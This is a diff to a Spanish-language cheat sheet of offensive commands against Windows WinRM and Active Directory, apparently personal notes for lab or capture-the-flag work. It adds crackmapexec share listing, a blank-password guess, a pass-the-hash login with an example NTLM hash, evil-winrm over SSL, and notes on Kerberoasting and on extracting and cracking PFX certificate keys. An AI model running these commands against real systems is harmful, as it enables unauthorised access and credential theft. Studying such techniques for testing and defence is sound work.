@@ -3,10 +3,16 @@
 ### Enumeracion
 crackmapexec winrm <ip> -u <"usr"> -p <"psw">
 #Permite enumerar el servicio winrm con las credenciales pasadas
+crackmapexec winrm <ip> -u <"usr"> -p <"psw"> -shares
+#Permite listar los shares como smbmap
+*Si falla no esta de mas probar con un usr X y pwd blnk
+crackmapexec winrm <ip> -u <"usr"> -H A52F78E4C751E5F5E17E1E9F3E58F4EE
+#Loguearse mediante el haash NTLM del usr
 
 ###Coneccion
 evil-winrm -i <ip> -u <"usr"> -p <"pswd">
 #Coneccion mediante usr y pswd
+#Usar flag -S para realizar coneccion mediante ssl
 
 ###Kerberoasting
 GetUserSPNs.py <domain>/usr:psswd
@@ -18,7 +24,7 @@ GetUserSPNs.py <domain>/usr:psswd
 Este file tiene un certificado ssl en PKCS12. Usando openssl podemos extraerlo
 openssl pkcs12 -in name.pfx -nocert -out key.pem -nodes
 openssl pkcs12 -in name.pfx -nokeys -out cert.pem
-#Extraccion
+#Extraccion de los certificados y key para coneccion con ssl
 
 En el caso de pedir pwd se puede utilizar johntheripper: pfx2john
 
